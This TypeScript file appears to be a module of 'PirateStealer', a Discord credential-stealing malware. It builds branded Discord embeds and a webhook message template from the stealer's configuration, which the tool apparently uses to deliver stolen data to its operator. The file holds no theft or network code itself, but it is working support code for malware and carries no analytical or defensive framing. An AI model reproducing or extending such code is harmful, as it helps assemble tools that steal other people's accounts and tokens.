import { ConfigFSBinder } from "../../configFSBinder";
import { MessageEmbed, WebhookMessageOptions } from "discord.js";
import { writeError } from "../../log";

export type GenWebhookMessage = () => WebhookMessageOptions;
export interface EmbedTemplate {
    webhookMessage: GenWebhookMessage;
    embeds: MessageEmbed[];
}
export function getBaseEmbeds(config: ConfigFSBinder, embedsCount = 1): EmbedTemplate {
    const stealerName = "PirateStealer";
    const embeds: MessageEmbed[] = [];
    for (let i = 0; i < embedsCount; i++) {
        const embed = new MessageEmbed();
        const color = config.getConfig()._stealerConfig["embed-color"];
        try {
            // will fail if invalid color
            embed.setColor(color);
        } catch (error) {
            writeError(error, `Unable to set color on base embed! Color type ${color}`);
        }
        embed.setAuthor(stealerName);
        embed.setFooter(stealerName);
        embeds.push(embed);
    }


    return {
        webhookMessage: () => {
            return {
                username: stealerName,
                embeds: embeds.map(e => e.toJSON()),
            };
        },
        embeds,
    };
}
